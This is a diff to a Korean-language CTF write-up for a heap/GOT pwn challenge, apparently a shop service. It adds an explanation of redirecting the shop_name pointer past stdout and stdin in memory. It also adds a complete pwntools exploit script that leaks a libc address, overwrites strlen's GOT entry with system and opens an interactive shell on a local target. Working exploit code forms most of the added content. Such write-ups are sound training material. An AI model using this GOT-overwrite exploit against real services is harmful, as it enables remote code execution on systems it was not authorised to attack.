@@ -93,10 +93,125 @@ C --> |head| D(GOT table)
 | offset | desc | value |
 | :------ |:--- | :---|
 | 0~7 | &head (\*0x6021F0) |<span style="color:#1070c0"><b>GOT</b></span>|
-| 8~11 | random bytes(0-9,a-f) |<span style="color:#1070c0"><b>\x11\x11</b></span>|
+| 8~11 | random bytes(0-9,a-f) |<span style="color:#1070c0"><b>\x11\x11\x11\x11</b></span>|
 | 12~43 | name (%s) |  |
 | 44~299 | description (%s) |  |
 | 300~304 | price (%.2f) |  |
 
-이때, item0 의 random bytes 는 `heystack` 에서 포함하지 않고 있는 값이어야 한다. item32~item1 까지 32개의 item 을 buying_list 에 추가하고 item0 는 추가하지 않고 head 를 따라가서 GOT 를 buying_list 에 추가하도록 유도하여 shop_name 을 덮어써야 한다.
-shop_name 이 GOT 의 주소를 가리키게 되었으면 **[n]** 명령어를 이용하여 해당 GOT 에 system 함수의 주소를 덮어쓴다.
+item0 의 random bytes 는 `heystack` 에서 포함하지 않고 있는 값이어야 한다. item32~item1 까지 32개의 item 을 buying_list 에 추가하고 item0 는 추가하지 않고 head 를 따라가서 GOT 를 buying_list 에 추가하도록 유도하여 shop_name 을 덮어써야 한다.
+
+이때, GOT-12 는 item 의 head 이므로 0을 가리키고 있어야 하고, GOT-4 는 random bytes 에 해당하므로 `heystack` 에서 포함하고 있는 값이어야 한다.
+
+<br>
+
+..하지만 GOT-12 에 0 이 들어가있는 함수가 없었고, 다음으로 생각할 수 있는 방법은 shop_name 이 `buying_list` 의 주소를 가리키도록 한 후, **[n]** 명령어를 통해 shop_name 을 GOT로 직접 덮어 쓰는 것이었다.
+
+buying_list-8 에는 0, -16 에는 stdin, -24 에는 0, -32 에는 stdout, -40 에는 0, -48 에는 0 이 위치하기 때문에 buying_list 를 바로 가리키게 할 수는 없었고 stdout-12 를 가리키게 하여 stdout, stdin 을 지나 buying_list 를 채우고 shop_name 을 덮어 쓸 수 있다.
+
+shop_name 에 GOT 의 주소를 썼으면, **[n]** 명령어를 이용하여 해당 GOT 에 system 함수의 주소를 쓸 수 있다.
+
+---
+## 공격 코드
+
+```python
+from pwn import *
+import sys, itertools
+
+
+def add(name, desc, price):
+	r.recvuntil('>')
+	r.sendline('a')
+	r.sendline(name)
+	r.sendline(desc)
+	r.sendline(str(price))
+
+def item_list():
+	r.recvuntil('>')
+	r.sendline('l')
+	for _ in range(33):
+		print r.recvuntil('\n'),
+
+def check(heystack):
+	r.recvuntil('>')
+	r.sendline('c')
+	r.sendline(heystack[:0x10002])
+	print r.recvuntil("process...\n")
+	print r.recvuntil("TOTAL:"),
+	total = r.recvuntil('\n')
+	print total
+	return total
+
+def rename(name):
+	r.recvuntil('>')
+	r.sendline('n')
+	r.sendline(name)
+
+def leak(addr):
+	item = p64(addr)		# head
+	rename(item)
+	item_list()
+	stdout_addr = r.recvuntil(':')[:-1]
+	stdout_addr = u64(stdout_addr+"\x00"*(8-len(stdout_addr)))
+	print "leak : "+hex(stdout_addr)
+	return stdout_addr
+
+
+#libc = ELF("./libc.so.6")
+libc = ELF("./libc-2.19.so")
+r = remote("127.0.0.1", 9916)
+
+
+print r.recvuntil(':')
+r.sendline("rls1004 shop")
+
+# 33개의 item 등록
+for i in range(33):
+	add("name"+str(i), "desc", 1)
+
+item_list()
+
+heystack = itertools.product("0123456789abcdef", repeat=4)
+
+heystack = map( ''.join, heystack )
+tmp = ''
+for rb in heystack:
+	if rb not in tmp:
+		tmp += rb
+
+heystack = tmp
+total = check(heystack)
+if "33" not in total:
+	check(heystack[len(heystack)-0x10002:])
+
+# information leak
+# 마지막 주소가 0x00 으로 끝나서 +1 위치를 leak 하고 0x100 을 곱함
+stdout_addr = leak(0x6020c0-12+1) * 0x100
+system_addr = stdout_addr - (libc.symbols['_IO_2_1_stdout_']-libc.symbols['system'])
+print "puts : 0x%X, system : 0x%x" % (stdout_addr, system_addr)
+
+
+# [stdout_got - 12][random bytes]
+rename(p64(0x6020C0-12)+"\x11")
+
+# stdout_got - 4 (random bytes) : 0x00000000
+total = check("\x00\x00\x00\x00"+heystack)
+
+strlen_got = 0x602028
+stdin_addr = stdout_addr - (libc.symbols['_IO_2_1_stdout_']-libc.symbols['_IO_2_1_stdin_'])
+print hex(stdout_addr)
+print hex(stdin_addr)
+
+payload = ''
+payload += 'a'*0xc            # [head][random_bytes]
+payload += p64(stdout_addr)
+payload += p64(0)
+payload += p64(stdin_addr)
+payload += p64(0)
+payload += p64(0)*32          # buying_list
+payload += p64(strlen_got-4)  # shop_name
+rename(payload)
+
+rename("sh\x00\x00"+p64(system_addr))
+
+r.interactive()
+```
